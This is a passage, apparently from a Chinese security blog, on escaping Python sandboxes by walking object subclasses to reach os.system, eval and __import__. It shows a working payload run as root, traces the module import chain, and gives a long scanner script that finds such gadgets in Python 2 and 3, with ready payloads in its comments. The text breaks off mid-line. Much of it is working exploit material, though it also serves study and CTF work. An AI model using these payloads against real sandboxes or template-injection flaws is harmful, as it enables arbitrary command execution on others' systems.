class="string">&#x27;property&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">23</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">24</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">25</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">26</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">27</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">28</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">29</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">30</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">31</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">32</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">33</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">34</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">35</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">36</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">37</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">38</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">39</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">40</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">41</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">42</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">43</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">44</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">45</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">46</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">47</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">48</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">49</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">50</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">51</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">52</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">53</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">54</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">55</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">56</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">57</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">58</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">63</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">64</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">65</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">66</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">67</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">68</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">69</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">70</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">71</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">73</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">74</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">75</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">76</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>我们直接看下python2中的逻辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/warnings.py</span><br></pre></td></tr></table></figure><p>可以看到导入了3个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> types</span><br></pre></td></tr></table></figure><p>然后再接着看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/linecache.py</span><br></pre></td></tr></table></figure><p>可以看到导入了2个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><p>那么久可以构成了这个代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h4><p>首先去Python的GitHub主页，找到所有的模块列表：</p><pre><code>Python2.7：https://github.com/python/cpython/tree/2.7/LibPython3.8：https://github.com/python/cpython/tree/3.8/Lib</code></pre><p>通过脚本进行筛选，执行方式看代码注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2022-09-22 13:30:58</span></span><br><span class="line"><span class="comment"># @Author  : ascotbe (ascotbe@gmail.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://www.ascotbe.com/</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_name</span>(<span class="params">url</span>):</span><br><span class="line">    file_name=[]</span><br><span class="line">    file_name_txt=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.json():</span><br><span class="line">        file_name.append(i[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        file_name_txt+=i[<span class="string">&#x27;name&#x27;</span>]+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;python.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(file_name_txt)</span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;python.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        modules = f.readlines()</span><br><span class="line">    modules = [m.strip().replace(<span class="string">&#x27;.py&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> m <span class="keyword">in</span> modules]</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>]</span><br><span class="line">    all_targets = target_modules + target_functions</span><br><span class="line">    results = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> modules:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = <span class="built_in">__import__</span>(m)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR:&#x27;</span>, m)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">in</span> module.__dict__:</span><br><span class="line">                results[m.encode()].append(t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可利用模块数量为:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(results)))</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">        <span class="built_in">print</span>(k, v)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python2</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python3</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;sys&#x27;].version</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。</span></span><br><span class="line">    <span class="comment"># 先要进入().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__中找到__builtins__模块，然后执行后面的代码</span></span><br><span class="line">    <span class="comment"># ().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    version= <span class="built_in">str</span>(sys.version_info.major)+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(sys.version_info.minor)</span><br><span class="line">    url=<span 